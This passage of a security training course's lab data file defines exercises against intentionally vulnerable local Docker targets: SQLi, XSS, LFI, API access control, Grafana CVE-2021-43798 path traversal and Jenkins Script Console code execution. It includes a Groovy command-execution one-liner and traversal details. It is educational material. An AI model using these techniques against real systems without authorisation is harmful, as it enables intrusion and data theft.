    ],
    platform: "bWAPP",
    difficulty: "easy",
    estimatedHours: 2,
    completionIndicator:
      "Screenshot showing a successful exploit at security level 'low' and the same attack re-run at 'medium', for all three categories (SQLi, Stored XSS, OS Command Injection), with a note on what the medium filter changed.",
    dockerImage: "raesene/bwapp",
    containerPort: 80,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/install.php once and click the button to install bWAPP's database -- a one-time step every fresh bWAPP container needs`,
      `Log in with bWAPP's documented default credentials: bee / bug`,
      `Set the security level slider (top right) to 'low' and select 'SQL Injection (GET/Search)'; confirm you can extract data with a UNION-based payload`,
      `Re-run the identical attack at security level 'medium' and note exactly what changed in the app's behavior or filtering`,
      `Repeat the same low-then-medium comparison for 'HTML Injection - Stored (Blog)' (stored XSS)`,
      `Repeat the same low-then-medium comparison for 'OS Command Injection'`,
      `For each of the 3 categories, write one sentence on what the medium filter blocked and whether you found a bypass`,
    ],
    resources: [
      {
        title: "bWAPP official page (itsecgames.com)",
        url: "http://www.itsecgames.com",
        type: "link",
      },
      {
        title: "bWAPP on Docker Hub",
        url: "https://hub.docker.com/r/raesene/bwapp",
        type: "tool",
      },
      {
        title: "OWASP Top 10",
        url: "https://owasp.org/www-project-top-ten/",
        type: "link",
      },
    ],
    slides: [
      {
        title: "Install bWAPP once, then log in",
        body: "Every fresh bWAPP container needs a one-time visit to /install.php to set up its database. After that, log in with the documented default bee / bug.",
      },
      {
        title: "SQL injection at 'low', then 'medium'",
        body: "Solve SQL Injection (GET/Search) with a UNION-based payload at security level low, then re-run the identical attack at medium and note exactly what changed.",
      },
      {
        title: "Stored XSS, same comparison",
        body: "Repeat the low-then-medium comparison on HTML Injection - Stored (Blog) — same payload family, same question: what does the medium filter actually block?",
      },
      {
        title: "OS command injection, same comparison",
        body: "Run the same low-then-medium comparison one more time on OS Command Injection to see the pattern hold across a third, unrelated vulnerability class.",
      },
      {
        title: "Why this matters",
        body: "A filter that blocks the obvious payload but not a slightly reshaped one is the exact gap real WAF bypass techniques exploit — seeing it three times across different bug classes makes the pattern impossible to miss.",
      },
    ],
    hints: [
      "Start with just one category at security level 'low' — SQL Injection (GET/Search) — and confirm you can extract data before worrying about what 'medium' changes.",
      "The instructions call for a UNION-based payload on the SQLi step; once that works at 'low', flip the slider to 'medium' and send that exact same payload again to see what the app does differently.",
      "Repeat that same low-then-medium comparison for 'HTML Injection - Stored (Blog)' and for 'OS Command Injection', and for each of the three write one sentence on what the medium filter blocked and whether a bypass got through.",
    ],
  },
  {
    id: "L42",
    number: 42,
    week: 10,
    moduleId: "m10",
    title: "Mutillidae II: LFI via Burp, hints on then off",
    description:
      "Mutillidae II ships its own built-in hint system and a security-level toggle, making it the target most commonly paired with Burp Suite in OWASP training because it forces you to intercept and rewrite requests instead of relying on obvious browser-visible forms. You'll drive it through Burp's proxy to solve its Local File Inclusion challenge, then repeat the exercise with hints fully disabled to confirm you can still identify the vulnerable parameter and traversal payload on your own. Pairing the same LFI/RFI skill against a differently-built target than DVWA's own File Inclusion module is what proves the skill generalized, rather than that you memorized DVWA's specific parameter name.",
    objective:
      "Use Burp Suite to find and exploit Mutillidae's Local File Inclusion vulnerability with hints enabled, then solve the identical challenge again with hints turned off.",
    successCriteria: [
      "Proxy traffic through Burp and identify the vulnerable 'page' parameter with hints enabled",
      "Use Burp Repeater to traverse outside the webroot with a ../ payload and read a file",
      "Reset the security level to hints-off and re-solve the same LFI challenge unaided",
      "Capture Burp screenshots of the successful request/response for both the hints-on and hints-off attempts",
    ],
    platform: "Mutillidae",
    difficulty: "medium",
    estimatedHours: 3,
    completionIndicator:
      "Burp Repeater screenshot showing the successful LFI request/response against the vulnerable 'page' parameter, captured both with hints enabled and with the security level reset to hints-off.",
    dockerImage: "citizenstig/nowasp",
    containerPort: 80,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/set-up-database.php once and click the setup button (Mutillidae's own one-time database initialization)`,
      `Configure Burp Suite (or your browser) to proxy through 127.0.0.1:8080 and confirm you can see Mutillidae's traffic in Burp's HTTP history`,
      `From the menu, open OWASP 2013 -> A1 - Injection (Other) -> Local File Inclusion, with hints enabled, and identify the vulnerable 'page' parameter`,
      `Use Burp Repeater to modify the request's page parameter with a ../ traversal payload until you read a file outside the intended webroot`,
      `Reset the security level to '0' (hints fully off, via the Toggle Hints / Security Level menu) and re-solve the exact same LFI challenge without any hint text visible`,
      `Compare your solve process with hints on vs off, and write 2-3 sentences on what you relied on the hints for the first time`,
    ],
    resources: [
      {
        title: "OWASP Mutillidae II (GitHub)",
        url: "https://github.com/webpwnized/mutillidae",
        type: "tool",
      },
      {
        title: "Mutillidae user guide",
        url: "https://github.com/webpwnized/mutillidae/wiki",
        type: "link",
      },
      {
        title: "Burp Suite documentation",
        url: "https://portswigger.net/burp/documentation",
        type: "link",
      },
    ],
    slides: [
      {
        title: "One-time setup, then proxy through Burp",
        body: "Visit /set-up-database.php once, then point Burp Suite (or your browser) at 127.0.0.1:8080 and confirm Mutillidae's traffic shows up in Burp's HTTP history.",
      },
      {
        title: "Find the vulnerable 'page' parameter",
        body: "Open OWASP 2013 -> A1 - Injection (Other) -> Local File Inclusion with hints enabled, and identify which request parameter controls which file gets included.",
      },
      {
        title: "Traverse out of the webroot in Repeater",
        body: "Use Burp Repeater to rewrite the page parameter with a ../ traversal payload until the response contains a file from outside the intended directory.",
      },
      {
        title: "Same bug, hints fully off",
        body: "Reset the security level to 0 so no hint text is shown, then solve the exact same LFI challenge again using only what you already learned.",
      },
      {
        title: "Why this matters",
        body: "Solving it once with hints proves you can follow instructions; solving it again with hints off proves you actually understood which parameter and which payload shape mattered.",
      },
    ],
    hints: [
      "Before hunting for the LFI menu item, make sure your browser or Burp is actually proxying through 127.0.0.1:8080 — check that Mutillidae's traffic shows up in Burp's HTTP history first.",
      "The vulnerable request field is the 'page' parameter, reached via OWASP 2013 -> A1 - Injection (Other) -> Local File Inclusion; once you've spotted it, think about what a ../ traversal does when it replaces part of that parameter's value.",
      "In Burp Repeater, rewrite the page parameter with a ../ traversal payload until the response shows a file from outside the webroot, then reset the security level to '0' via the Toggle Hints / Security Level menu and repeat that same request with no hint text visible.",
    ],
  },
  {
    id: "L43",
    number: 43,
    week: 10,
    moduleId: "m10",
    title: "DSVW: 45-minute vulnerability speed round",
    description:
      "Damn Small Vulnerable Web packs roughly 50 distinct vulnerabilities into a single Python file small enough to read end to end in one sitting, and this lab uses that density deliberately: instead of one deep dive, you work through its listed vulnerability categories as a timed scavenger hunt, solving as many as you can inside a set window. Because every category lives one click away from the last, the constraint here isn't finding the bug — it's recognizing which OWASP class you're looking at fast enough to pick the right technique on the first try, the same speed real CTF scoring and time-boxed engagements reward. A final tally of categories solved versus attempted is the artifact that matters, not a single polished write-up.",
    objective:
      "Work through as many of DSVW's bundled vulnerability categories as possible inside a 45-minute timer, recognizing each OWASP class quickly enough to apply the right technique on the first try.",
    successCriteria: [
      "Set a 45-minute timer and attempt categories such as SQL Injection, XSS, Command Injection, XXE, SSRF, and LFI",
      "Record the working one-line payload or technique for every category solved",
      "Tally categories solved versus attempted once the timer ends",
      "Identify the single hardest category and explain what made it harder than the rest",
    ],
    platform: "DSVW",
    difficulty: "medium",
    estimatedHours: 2,
    completionIndicator:
      "A written tally of categories attempted vs solved within the 45-minute window, with the working payload noted for each solved category.",
    dockerImage: "appsecco/dsvw",
    containerPort: 8000,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/ to see DSVW's full list of vulnerability categories on the landing page`,
      `Set a 45-minute timer before you open the first category`,
      `Work through as many listed categories as you can (SQL Injection, XSS, Command Injection, XXE, SSRF, LFI, and others DSVW lists) -- for each one you attempt, note whether you solved it or got stuck`,
      `For every category you solve, write the one-line payload or technique that worked`,
      `When the timer ends, tally solved vs attempted and pick the single category that took longest -- write 2-3 sentences on what made it harder than the rest`,
    ],
    resources: [
      {
        title: "DSVW (GitHub)",
        url: "https://github.com/appsecco/dsvw",
        type: "tool",
      },
      {
        title: "OWASP Top 10",
        url: "https://owasp.org/www-project-top-ten/",
        type: "link",
      },
    ],
    slides: [
      {
        title: "One tiny app, ~50 vulnerabilities",
        body: "DSVW packs its entire vulnerability set into a single small Python file. Browse to the target and set a 45-minute timer before opening the first category.",
      },
      {
        title: "Work the list, don't linger",
        body: "Move through the listed categories — SQL Injection, XSS, Command Injection, XXE, SSRF, LFI, and others — noting for each whether you solved it or got stuck.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Pick category",
              detail: "read the listed name",
            },
            {
              label: "Guess the class",
              detail: "which OWASP category?",
            },
            {
              label: "Try the technique",
              detail: "matching payload",
            },
            {
              label: "Solve or skip",
              detail: "note it, move on",
            },
          ],
        },
      },
      {
        title: "Record the working payload",
        body: "For every category you solve, write down the exact one-line payload or technique that worked — that's the artifact this lab is graded on.",
      },
      {
        title: "Tally and reflect",
        body: "When the timer ends, count solved vs attempted and identify the single category that took longest, then write a couple of sentences on what made it harder.",
      },
      {
        title: "Why this matters",
        body: "Recognizing which vulnerability class you're looking at fast enough to pick the right technique on the first try is exactly what timed CTF scoring and real time-boxed engagements reward.",
      },
    ],
    hints: [
      "Set your 45-minute timer before opening the first category on DSVW's landing page — this lab rewards speed and recognition over depth on any single bug.",
      "For each category you open (SQL Injection, XSS, Command Injection, XXE, SSRF, LFI, and the others DSVW lists), first name which OWASP class you think it is before picking a technique to try.",
      "For every category you actually solve, write down the exact one-line payload that worked; when the timer ends, tally solved vs attempted and note which single category took longest and why.",
    ],
  },
  {
    id: "L44",
    number: 44,
    week: 9,
    moduleId: "m9",
    title: "VAmPI: REST API security, no browser UI to lean on",
    description:
      "Every OWASP API Top 10 category -- broken object-level authorization, mass assignment, excessive data exposure -- needs a real JSON API to practice against, and VAmPI is built specifically as that target: a small, intentionally vulnerable Flask REST API with no browser UI to distract from the requests themselves. Working entirely through Burp or curl, you'll register a user, then use another user's numeric ID to pull their data through a broken object-level authorization flaw, exploit a mass-assignment bug by adding a field the API was never supposed to accept from a client, and inspect the API's own JWT for a signing weakness. This is deliberately the first lab in the program where there's no page to click through -- every finding comes from reading and rewriting a raw HTTP request.",
    objective:
      "Test a purely API-driven target (VAmPI) with Burp or curl to exploit Broken Object Level Authorization and Mass Assignment, and inspect its JWT for weaknesses.",
    successCriteria: [
      "Register two users and obtain a JWT via login",
      "Retrieve another user's data as an unauthorized user via BOLA on the per-user profile endpoint",
      "Add an unexpected field (e.g. an admin flag) to a user-update request and confirm the API accepts it",
      "Decode the JWT and map both findings to their OWASP API Top 10 categories in a written report",
    ],
    platform: "VAmPI",
    difficulty: "medium",
    estimatedHours: 3,
    completionIndicator:
      "Burp or curl request/response pairs showing the successful Broken Object Level Authorization request (another user's data returned) and the successful mass-assignment request, each mapped to its OWASP API Top 10 category.",
    dockerImage: "erev0s/vampi",
    containerPort: 5000,
    instructions: [
      `Click 'Start Lab' above, then confirm the API is reachable: browse to http://localhost:18080/ and confirm you get a JSON welcome response, not a webpage`,
      `Review the API's own documentation endpoint (VAmPI ships a Swagger/OpenAPI spec) to see every available route before testing`,
      `Register two separate users via the /users/v1/register endpoint and log in as the first one to get a JWT`,
      `Exploit Broken Object Level Authorization: as user 1, request user 2's profile data by username at the /users/v1/<username> endpoint and confirm you receive data you shouldn't be able to see`,
      `Exploit Mass Assignment: find the user-update endpoint and add an unexpected field (e.g. an admin flag) to your update request body, then check whether the API accepted and stored it`,
      `Decode your own JWT at jwt.io and note its signing algorithm and claims`,
      `Write a short report: which OWASP API Top 10 category each of your 2 findings maps to, and the exact request that triggered each`,
    ],
    resources: [
      {
        title: "VAmPI (GitHub)",
        url: "https://github.com/erev0s/VAmPI",
        type: "tool",
      },
      {
        title: "OWASP API Security Top 10",
        url: "https://owasp.org/www-project-api-security/",
        type: "link",
      },
      { title: "jwt.io — JWT decoder", url: "https://jwt.io", type: "tool" },
    ],
    slides: [
      {
        title: "No browser UI — just requests",
        body: "Confirm the API is up (a JSON welcome response, not a webpage), then review its Swagger/OpenAPI documentation endpoint before sending a single test request.",
      },
      {
        title: "Register two users",
        body: "Create two separate accounts through /users/v1/register, then log in as the first one to obtain a JWT for the requests that follow.",
      },
      {
        title: "Broken Object Level Authorization",
        body: "As user 1, request user 2's data by username at /users/v1/<username> and confirm the API hands it back without checking whose token you sent.",
        diagram: {
          type: "request-response",
          leftLabel: "You (user 1)",
          rightLabel: "VAmPI API",
          exchanges: [
            {
              direction: "right",
              label: "GET /users/v1/<user2>",
              payload: "Authorization: Bearer <user1 JWT>",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "user 2's full profile data",
            },
          ],
        },
      },
      {
        title: "Mass assignment on update",
        body: "Find the user-update endpoint and add a field the client was never meant to set, such as an admin flag, then check whether the API accepted and stored it.",
      },
      {
        title: "Why this matters",
        body: "Every finding here came from reading and rewriting a raw HTTP request, not clicking a page — that's the actual daily work behind an OWASP API Top 10 finding.",
      },
    ],
    hints: [
      "Check the API's own Swagger/OpenAPI documentation endpoint first — it lists every route you'll need, including registration, login, and the per-user profile lookup.",
      "Register two separate users and log in as the first one to get a JWT; then think about what happens if you request the second user's data by username at /users/v1/<username> using only the first user's token.",
      "For mass assignment, find the user-update endpoint and add a field to the request body the client was never meant to set, such as an admin flag, then check whether the API stored it — and don't forget to decode your own JWT at jwt.io to see its signing algorithm.",
    ],
  },
  {
    id: "L45",
    number: 45,
    week: 11,
    moduleId: "m11",
    title: "Grafana: exploit a real, disclosed CVE (CVE-2021-43798)",
    description:
      "CVE-2021-43798 is a real, publicly disclosed Grafana vulnerability -- an unauthenticated path-traversal flaw in how versions 8.0.0-beta1 through 8.3.0 served a plugin's static assets, letting anyone read arbitrary files off the host filesystem without logging in. This lab has you confirm the exact version running, then research the public advisory and a proof-of-concept yourself and adapt it against your own local, disposable copy of that exact vulnerable version -- the same research-to-exploit workflow a real engagement runs against any newly disclosed CVE, rather than a payload handed to you pre-solved. Once you've confirmed unauthenticated file read, you pivot to Grafana's own default admin/admin credentials to compare what an authenticated attacker can additionally reach.",
    objective:
      "Research and exploit the real, disclosed Grafana path-traversal vulnerability CVE-2021-43798 against a deliberately vulnerable 8.3.0 instance, then compare unauthenticated versus authenticated access.",
    successCriteria: [
      "Confirm the target instance reports the vulnerable version 8.3.0",
      "Research the official advisory/PoC and read a file outside the intended directory via unauthenticated plugin path traversal",
      "Log in with default admin/admin credentials and note what additional access an authenticated attacker gains",
      "Write up the vulnerable version, the unauthenticated impact, and why patching to 8.3.1+ closes it",
    ],
    platform: "Grafana",
    difficulty: "hard",
    estimatedHours: 3,
    completionIndicator:
      "Terminal or Burp screenshot showing the confirmed vulnerable version (8.3.0) and an unauthenticated request that successfully reads a file outside the intended plugin directory.",
    dockerImage: "grafana/grafana:8.3.0",
    containerPort: 3000,
    instructions: [
      `Click 'Start Lab' above, then confirm the exact version via http://localhost:18080/api/health -- it must report version 8.3.0, the last vulnerable release before 8.3.1 patched this CVE`,
      `Research CVE-2021-43798 from its official NVD/Grafana advisory and at least one public proof-of-concept write-up`,
      `List the plugins installed on your instance via GET http://localhost:18080/api/plugins`,
      `Adapt the documented path-traversal technique against one installed plugin's /public/plugins/<plugin-id>/ path to read a file outside the intended directory, entirely unauthenticated`,
      `Once confirmed, log in normally with Grafana's default credentials (admin/admin) and note what an authenticated attacker can additionally do (data source configs, saved dashboards) that the unauthenticated file-read alone could not reach`,
      `Write a short finding: the exact vulnerable version, the unauthenticated impact, and why patching to 8.3.1+ closes it`,
    ],
    resources: [
      {
        title: "NVD: CVE-2021-43798",
        url: "https://nvd.nist.gov/vuln/detail/CVE-2021-43798",
        type: "link",
      },
      {
        title: "Grafana security advisory (GitHub)",
        url: "https://github.com/grafana/grafana/security/advisories/GHSA-69j6-29vr-p3j9",
        type: "link",
      },
      {
        title: "Grafana releases (GitHub)",
        url: "https://github.com/grafana/grafana/releases",
        type: "link",
      },
    ],
    slides: [
      {
        title: "Confirm the exact vulnerable version",
        body: "CVE-2021-43798 affects Grafana 8.0.0-beta1 through 8.3.0. Check /api/health and confirm the running instance reports exactly 8.3.0, the last vulnerable release.",
      },
      {
        title: "Research the real advisory first",
        body: "Read the official NVD entry and Grafana's own security advisory for CVE-2021-43798, plus at least one public proof-of-concept write-up, before attempting anything.",
      },
      {
        title: "Find an installed plugin to traverse from",
        body: "List installed plugins via GET /api/plugins — the path-traversal technique goes through one of these plugins' own public-assets path.",
      },
      {
        title: "Read a file with no authentication",
        body: "Adapt the documented traversal technique against the plugin's /public/plugins/<plugin-id>/ path until you read a file outside the intended directory — entirely unauthenticated.",
      },
      {
        title: "Compare against an authenticated view",
        body: "Log in with Grafana's default admin/admin and note what an authenticated attacker can additionally reach — data source configs, saved dashboards — beyond the unauthenticated file read alone.",
      },
      {
        title: "Why this matters",
        body: "This is the real research-to-exploit workflow behind any newly disclosed CVE: confirm the version, read the advisory, adapt a public PoC — not a payload handed to you pre-solved.",
      },
    ],
    hints: [
      "First confirm via /api/health that the instance really reports version 8.3.0 — the whole CVE only applies through that exact version.",
      "List the installed plugins via GET /api/plugins; the CVE's path traversal runs through one of those plugins' own /public/plugins/<plugin-id>/ path, not through any login form.",
      "Read the official NVD/Grafana advisory and a public proof-of-concept write-up for CVE-2021-43798, then adapt that same traversal technique against the plugin path to read a file outside the intended directory entirely unauthenticated — afterward, log in with admin/admin and compare what extra you can reach.",
    ],
  },
  {
    id: "L46",
    number: 46,
    week: 11,
    moduleId: "m11",
    title: "Jenkins: setup exposure to Groovy Script Console RCE",
    description:
      "An exposed Jenkins instance is one of the most consistently valuable footholds in real internal-network engagements, because its Script Console -- when reachable -- runs arbitrary Groovy with the same privileges as the Jenkins service account, often meaning full host code execution the moment you're authenticated. This lab starts you exactly where a real assessment does: enumerating a freshly-deployed Jenkins instance's setup-wizard exposure, retrieving the auto-generated initial admin password the way an assessor with local access to the host would, and finishing the setup wizard yourself. Once inside, you reach Manage Jenkins -> Script Console and confirm you can execute an arbitrary Groovy one-liner -- the same technique that turns 'we found a Jenkins box' into 'we have code execution on it.'",
    objective:
      "Enumerate a freshly deployed Jenkins instance, complete its setup wizard using the auto-generated admin password, then achieve code execution through the Script Console.",
    successCriteria: [
      "Retrieve the initial admin password from the container's startup logs and finish setup as your own admin user",
      "Navigate to Manage Jenkins -> Script Console",
      "Run a Groovy one-liner and confirm it returns real output from the underlying OS",
      "Explain why an exposed, unauthenticated Script Console is equivalent to full remote code execution",
    ],
    platform: "Jenkins",
    difficulty: "hard",
    estimatedHours: 3,
    completionIndicator:
      'Script Console screenshot showing a Groovy one-liner (e.g. println "id".execute().text) executed with real OS command output returned.',
    dockerImage: "jenkins/jenkins:lts",
    containerPort: 8080,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/login and confirm Jenkins is running its first-time setup wizard`,
      `On your own machine (with Docker installed), retrieve the auto-generated initial admin password by running: docker logs technieum-lab-l46 and copying the password Jenkins printed during startup`,
      `Paste that password into the setup wizard, choose 'Install suggested plugins,' and create your own admin user to finish setup`,
      `Log in as your new admin user and navigate to Manage Jenkins -> Script Console`,
      `Run a simple Groovy one-liner (e.g. println "id".execute().text) and confirm it returns real output from the underlying OS`,
      `Write 2-3 sentences on why an exposed, unauthenticated Script Console is equivalent to full remote code execution on the host running Jenkins`,
    ],
    resources: [
      {
        title: "Jenkins on Docker Hub",
        url: "https://hub.docker.com/r/jenkins/jenkins",
        type: "tool",
      },
      {
        title: "Jenkins Script Console documentation",
        url: "https://www.jenkins.io/doc/book/managing/script-console/",
        type: "link",
      },
      {
        title: "Jenkins security advisories",
        url: "https://www.jenkins.io/security/advisories/",
        type: "link",
      },
    ],
    slides: [
      {
        title: "A fresh Jenkins runs its setup wizard",
        body: "Browse to /login and confirm Jenkins is showing its first-time setup wizard, exactly like an assessor would find it during initial recon of an exposed instance.",
      },
      {
        title: "Retrieve the initial admin password",
        body: "On your own machine, run docker logs against the lab's container to read the auto-generated initial admin password Jenkins printed at startup.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "docker logs technieum-lab-l46",
            },
          ],
        },
      },
      {
        title: "Finish setup as your own admin",
        body: "Paste the recovered password into the wizard, install the suggested plugins, and create your own admin user to complete setup.",
      },
      {
        title: "Reach the Script Console",
        body: "Log in as your new admin and navigate to Manage Jenkins -> Script Console, the feature that runs arbitrary Groovy with the Jenkins service account's own privileges.",
      },
      {
        title: "Run a real OS command through Groovy",
        body: 'Execute a one-liner such as println "id".execute().text and confirm the output comes from the real underlying operating system, not a sandbox.',
      },
      {
        title: "Why this matters",
        body: "An exposed, unauthenticated Script Console is the exact detail that turns 'we found a Jenkins box' into 'we have code execution on it' in a real engagement report.",
      },
    ],
    hints: [
      "Confirm Jenkins is showing its first-time setup wizard at /login before trying any typical default login — this version doesn't skip that wizard.",
      "The initial admin password isn't shown anywhere in the browser; it's printed to the container's own startup logs, which you can read from your own machine if you have Docker installed.",
      "Run `docker logs technieum-lab-l46` to read that auto-generated password, finish the wizard as your own admin, then go to Manage Jenkins -> Script Console — a Groovy one-liner run there executes with the same privileges as the Jenkins service account.",
    ],
  },
  {
    id: "L47",
    number: 47,
    week: 9,
    moduleId: "m9",
    title: "Juice Shop: Injection & XSS challenge track",
    description:
      "OWASP Juice Shop scores every one of its built-in challenges by real vulnerability class, and this lab works a second, distinct slice of that challenge board from the session-cookie lab earlier in the program: its Injection and XSS tracks. You'll solve Juice Shop's login-bypass SQL injection challenge against its login form, then its DOM XSS challenge by getting a payload to execute purely client-side, and finally its persisted XSS challenge by getting a stored payload to fire for a different, later visitor. Juice Shop's own scoreboard confirms each solve in real time, so this lab is graded the same way the app grades itself.",
    objective:
      "Solve OWASP Juice Shop's Injection and XSS challenge track — a login-bypass SQL injection, a DOM XSS, and a persisted XSS challenge — and verify each on the app's own score board.",
    successCriteria: [
      "Locate the hidden score board and solve 'Login Admin' via SQL injection against the login form",
      "Solve the DOM XSS challenge with a payload that executes purely client-side",
      "Solve the Tier 2 persisted XSS challenge so the stored payload fires on a later, separate page load",
      "Screenshot the score board showing all three challenges solved, noting each one's OWASP category",
    ],
    platform: "Juice Shop",
    difficulty: "medium",
    estimatedHours: 2,
    completionIndicator:
      "Score board screenshot showing the 'Login Admin' (SQLi), DOM XSS, and Tier 2 (persisted XSS) challenges all marked solved.",
    dockerImage: "bkimminich/juice-shop",
    containerPort: 3000,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/ and open the hidden score board at /#/score-board -- intentionally undocumented in the UI, finding it is the app's first challenge`,
      `Solve the 'Login Admin' challenge: use SQL injection against the login form to authenticate as the admin account without knowing its password`,
      `Solve the 'DOM XSS' challenge by getting a payload to execute entirely in the browser via a client-side sink, with no server round-trip`,
      `Solve the 'XSS Tier 2' (persisted/stored XSS) challenge by getting your payload to fire when a different, later page load renders the stored data`,
      `For each of the 3 solves, note in the score board which OWASP category Juice Shop itself tags the challenge with`,
      `Screenshot the score board showing all 3 challenges marked solved`,
    ],
    resources: [
      {
        title: "OWASP Juice Shop (GitHub)",
        url: "https://github.com/juice-shop/juice-shop",
        type: "tool",
      },
      {
        title: "Juice Shop official challenge solutions",
        url: "https://pwning.owasp-juice.shop/",
        type: "link",
      },
      {
        title: "OWASP Top 10",
        url: "https://owasp.org/www-project-top-ten/",
        type: "link",
      },
    ],
    slides: [
      {
        title: "Find the hidden score board first",
        body: "Juice Shop's score board at /#/score-board is intentionally undocumented in the UI — finding it is itself the app's first challenge, and it tracks every solve that follows.",
      },
      {
        title: "SQL-inject your way into admin",
        body: "Solve the 'Login Admin' challenge by using SQL injection against the login form to authenticate as the admin account without ever knowing its password.",
      },
      {
        title: "DOM XSS — no server round-trip",
        body: "Get a payload to execute purely client-side through a DOM sink, with no request to the server needed to trigger it.",
      },
      {
        title: "Persisted XSS fires for someone else",
        body: "Solve the Tier 2 stored XSS challenge by getting your payload saved once and then triggered on a later, separate page load — proving it doesn't just fire for you.",
      },
      {
        title: "Why this matters",
        body: "Juice Shop's own score board tags each challenge with its real OWASP category, so this walkthrough is graded exactly the way the app grades itself — no separate flag format to invent.",
      },
    ],
    hints: [
      "The score board isn't linked anywhere in the visible UI — it lives at /#/score-board, and finding it is treated as the app's own first challenge.",
      "For 'Login Admin', think about what a SQL injection payload placed in the login form could do to the query that checks credentials — you don't need to know the admin's real password, just make the check pass.",
      "DOM XSS needs a payload that fires purely client-side through a sink with no server round-trip; the Tier 2 challenge needs that same kind of payload saved once so it fires again on a separate, later page load for someone else.",
    ],
  },
  {
    id: "L48",
    number: 48,
    week: 10,
    moduleId: "m10",
    title: "Juice Shop: Business Logic & Access Control challenge track",
    description:
      "Juice Shop's Broken Access Control and business-logic challenges are deliberately not injection bugs at all -- they're cases where the application logic itself makes a wrong assumption, the failure mode OWASP ranks as the single most common web vulnerability class. You'll solve its Forged Coupon challenge by reverse-engineering how a real discount code is generated rather than guessing one, its basket-manipulation challenge by editing another user's shopping basket via a request parameter the server should have validated against your own session, and its Five-Star Feedback challenge by manipulating a rating field the client wasn't supposed to be able to set that high. None of these three needs SQL injection or XSS -- they need you to notice where the server trusted a client-supplied value it shouldn't have.",
    objective:
      "Solve Juice Shop's Broken Access Control and business-logic challenges — Forged Coupon, basket manipulation, and Five-Star Feedback — none of which require an injection payload.",
    successCriteria: [
      "Reverse-engineer the real discount-code pattern to solve the Forged Coupon challenge",
      "Access another user's shopping basket by editing an intercepted basket ID",
      "Submit a product rating via a request parameter the UI itself never exposes",
      "Confirm all three challenges solved on the score board and note whether each is tagged Broken Access Control or business logic",
    ],
    platform: "Juice Shop",
    difficulty: "medium",
    estimatedHours: 3,
    completionIndicator:
      "Score board screenshot showing the Forged Coupon, basket-manipulation, and Five-Star Feedback challenges all marked solved, with the request that triggered each.",
    dockerImage: "bkimminich/juice-shop",
    containerPort: 3000,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/ and log back into the account you used (or create a new one) for this lab`,
      `Solve the 'Forged Coupon' challenge: reverse-engineer the pattern Juice Shop uses to generate its real discount codes rather than brute-forcing one`,
      `Solve the basket-manipulation challenge: intercept a request that includes a basket ID and change it to access a different user's shopping basket`,
      `Solve the 'Five-Star Feedback' challenge by submitting a product rating through a request parameter the UI itself doesn't expose, at a value the interface never allows`,
      `Open the score board and confirm all 3 are marked solved, noting which category (Broken Access Control vs. business logic) Juice Shop itself assigns each one`,
      `Write 2-3 sentences on what all three findings have in common: none of them used an injection payload`,
    ],
    resources: [
      {
        title: "OWASP Juice Shop (GitHub)",
        url: "https://github.com/juice-shop/juice-shop",
        type: "tool",
      },
      {
        title: "Juice Shop official challenge solutions",
        url: "https://pwning.owasp-juice.shop/",
        type: "link",
      },
      {
        title: "OWASP Top 10 — Broken Access Control",
        url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
        type: "link",
      },
    ],
    slides: [
      {
        title: "Reverse-engineer the coupon pattern",
        body: "Solve the Forged Coupon challenge by working out how Juice Shop actually generates its discount codes, rather than brute-forcing random strings.",
      },
      {
        title: "Reach another user's basket",
        body: "Intercept a request carrying a basket ID and change it to a different value — access to someone else's basket should have been checked against your own session, and wasn't.",
      },
      {
        title: "Set a rating the UI never allows",
        body: "Solve the Five-Star Feedback challenge by sending a rating value through the request body directly, at a value the interface itself never exposes as an option.",
      },
      {
        title: "Check the score board's own labels",
        body: "Confirm all three challenges are marked solved, and note whether Juice Shop tags each one as Broken Access Control or as a business-logic flaw.",
      },
      {
        title: "Why this matters",
        body: "None of these three findings used an injection payload — each one came from noticing a place the server trusted a client-supplied value it should have validated against reality.",
      },
    ],
    hints: [
      "None of these three challenges need an injection payload — look instead for a place where the server just trusts whatever value the client sends it.",
      "For Forged Coupon, think about the pattern Juice Shop's code might actually use to generate a real discount code, rather than brute-forcing random strings; for the basket challenge, look at what identifies 'whose basket' in a request you can intercept.",
      "Try changing that basket ID in an intercepted request to a value other than your own session's, and for Five-Star Feedback, send the rating through the request body directly at a value the UI itself never lets you pick.",
    ],
  },
  {
    id: "L49",
    number: 49,
    week: 14,
    moduleId: "m17",
    title: "TryHackMe: Windows PrivEsc room + your own SSH tunnel",
    description:
      "Windows privilege escalation and pivoting are two separate skills that only become useful together: escalating to SYSTEM on a beachhead host is worthless if you can't then reach the internal network segment behind it. TryHackMe's 'Windows PrivEsc' room walks the full checklist this module covers — service misconfigs, unquoted paths, AlwaysInstallElevated, and token impersonation via a Potato-family exploit — against a real intentionally-misconfigured Windows VM. You then close the loop yourself: set up an SSH local port forward between two machines you control (a VM, a spare device, or a cloud instance) and confirm you can reach a service on the 'far' machine only through the tunnel, proving the mechanic before you ever need it live.",
    objective:
      "Escalate privileges to SYSTEM on a misconfigured Windows target via TryHackMe's Windows PrivEsc room, then set up and verify your own SSH local port-forward tunnel to a service otherwise unreachable.",
    successCriteria: [
      "Manually enumerate services, scheduled tasks, and autoruns, then cross-check with WinPEAS or Seatbelt",
      "Exploit a privilege escalation vector (unquoted path, weak service ACL, AlwaysInstallElevated, or token impersonation) to reach SYSTEM",
      "Set up an SSH -L tunnel between two machines you control and confirm you can reach the far machine's service only through it",
      "Explain what SYSTEM access on a beachhead host would let you additionally reach via tunneling on a real internal network",
    ],
    platform: "TryHackMe",
    difficulty: "medium",
    estimatedHours: 3,
    completionIndicator:
      "TryHackMe room completion screenshot (green progress badge on the Windows PrivEsc room) plus a terminal screenshot showing a successful connection through your own SSH -L tunnel to a service that isn't directly reachable without it.",
    instructions: [
      `Deploy TryHackMe's "Windows PrivEsc" room and connect via the room's provided credentials/RDP`,
      `Run a manual enumeration pass first (services, scheduled tasks, registry autoruns) before reaching for an automated tool, to build the checklist from memory`,
